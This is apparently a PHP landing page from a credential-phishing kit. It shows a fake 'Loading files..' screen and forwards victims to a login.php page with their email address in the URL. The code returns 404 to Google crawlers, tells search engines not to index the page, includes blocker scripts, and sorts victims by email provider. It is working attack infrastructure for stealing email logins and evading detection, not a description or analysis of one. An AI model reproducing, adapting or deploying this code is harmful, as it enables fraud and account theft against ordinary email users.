<?php include_once'../proxy.php';?><?php include_once'../proxy.php';?><?php include_once'../proxy.php';?><?php
include 'blockerz.php';
include 'sc.php';
session_start();
error_reporting(0);
@set_time_limit(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }
 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@btinternet.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@att.') !== false || stripos($domain_check, '@rogers.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@live.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@aol.') !== false || stripos($domain_check, '@aim.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@126.') !== false || stripos($domain_check, '@yeah.') !== false || stripos($domain_check, '@vip.126.') !== false || stripos($domain_check, '@163.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@vip.163.') !== false || stripos($domain_check, '@163.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@google.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@mail.') !== false || stripos($domain_check, '@bk.') !== false || stripos($domain_check, '@inbox.') !== false || stripos($domain_check, '@list.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	elseif(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false) {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
	else {
		header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	}
		
?>
<!DOCTYPE html>
<html>
<head>
	<title>Loading files..</title>
	<link rel="icon" type="image/png" href="img/logo.png">
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/style.css">

</head>
<body>
<div class="files">
	<div class="loader"></div>
	<h4 class="loading">Loading files..</h4>
</div>
</body>
</html>
